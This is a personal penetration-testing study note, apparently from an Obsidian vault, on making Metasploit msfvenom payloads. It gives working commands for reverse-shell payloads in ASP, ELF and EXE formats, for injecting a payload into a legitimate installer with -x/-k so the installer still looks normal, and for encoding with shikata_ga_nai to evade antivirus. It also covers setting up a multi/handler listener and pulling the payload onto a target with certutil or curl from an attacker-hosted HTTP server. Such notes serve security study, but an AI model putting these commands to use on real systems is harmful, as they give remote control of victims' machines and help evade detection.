### **Staged vs Non-Staged Payloads:**
`msfvenom --list payloads`

![[Pasted image 20250419170617.png | 1000]]



# **Commands:**
`-a` specify the arch of the target, `x86` is a 32 bit system and `x64` is a 64 bit system.
`-p` specify the payload, e.g. `windows/meterpreter/reverse_tcp`
`LHOST=<ur attacking machine IP>` 
`LPORT=<Attackin machine Port>`
`-f <format of payload>` example: exe, asp, pdf. then output it using `-f exe > /home/asem/test_payload.exe`
`-e <encoding_file>`  example: `x86/shikata_ga_nai` 
`-x <file to inject>`  Inject payload in a installation file or something
`-k`   Used with `-x` to make the Injected file run normally after the user run it to make it look legitimate.


---
# **To generate #msfvenom Payloads:**
#### **64-bit Windows asp reverse shell payload⬇**

	msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<ur_machine_ip> LPORT=<port_to_listen> -f asp > shell.asp


#### **32-bit Linux elf reverse shell payload:**

	msfvenome -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=7777 -f elf > file.elf


#### <mark style="background: #e74c3c;"> **It's recommended to use a 32 bit payload so if u don't know the arch of the target it works either way **</mark>  
<br>

#### **After creating our payload now we want to listen to it:**
- In msfconsole: `use multi/handler`
- Then set the payload we used when we created the payload above: `set payload windows/meterpreter/reverse_tcp`
- Then set the LHOST & LPORT: `set LHOST <our_attacking_machine_ip>`   Then `set LPORT <listening_port>`


---


---


# **Encode Payloads to evade signature based-AVs:**
- This technique is not used anymore because Anti Viruses have a huge database of signature of malwares so it's easy to detect them.

#### To list all encoders available:
`msfvenom --list encoders`

Best encoders have the excellent rank: 
This is used to encode powershell scripts:

	cmd/powershell_base64

Can encode both Linux and Windows payloads 

	x86/shikata_ga_nai


To encode a payload (With 10 iteration. More than that doesn't help actually):

	msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.100.37 LPORT=7777 -i 10 -e x86/shikata_ga_nai -f exe > /home/asem/Desktop/shikata_win_32.exe


![[Pasted image 20250419190210.png | 1100]]




---


# **Listen:**

`use multi/handler`  

Then the same: `LHOST` and `LPORT` and `Payload`

---


# **Host the Payload to a Python HTTP server:**
in a python2 environment:

	python -m SimpleHTTPServer 80

in a python3 environment:

	python -m http.server 80

#### Then use this built in Windows utility to download a file from the web:
	certutil -urlcache -f http://10.10.45.3/payload.exe payload.exe

#### Or use curl:

	curl http://10.10.45.3/payload.exe > payload.exe




